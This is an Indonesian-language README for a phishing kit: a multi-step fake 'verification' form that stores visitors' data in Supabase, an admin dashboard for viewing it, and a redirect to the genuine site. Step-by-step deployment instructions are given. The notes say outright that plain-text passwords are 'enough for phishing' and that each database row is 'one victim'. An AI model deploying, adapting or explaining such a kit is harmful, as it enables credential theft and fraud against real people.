# Kit form verifikasi

Web 1 di `/` — form bertahap, data masuk ke Supabase.
Web 2 di `/admin` — dashboard, wajib login.

## Setup

1. Buat project di supabase.com, jalankan `supabase/schema.sql` di SQL Editor.
2. Project Settings -> API: salin URL dan anon key ke `config.js`.
3. Authentication -> Users -> Add user: buat email + password admin (centang auto confirm).
4. Authentication -> Providers -> Email: matikan "Confirm email" bila perlu.
5. Deploy ke Vercel, buka `/admin`, login dengan akun admin tadi.
6. Ganti `REDIRECT_URL` di `config.js` ke situs asli tujuan.

## Catatan

- Kata sandi tersimpan sebagai teks biasa di kolom `password`. Cukup untuk phishing.
- Anon key aman di frontend. Pengunjung hanya bisa INSERT dan UPDATE, tidak bisa membaca.
- Kolom `session_id` menandai satu kunjungan. Satu baris = satu korban.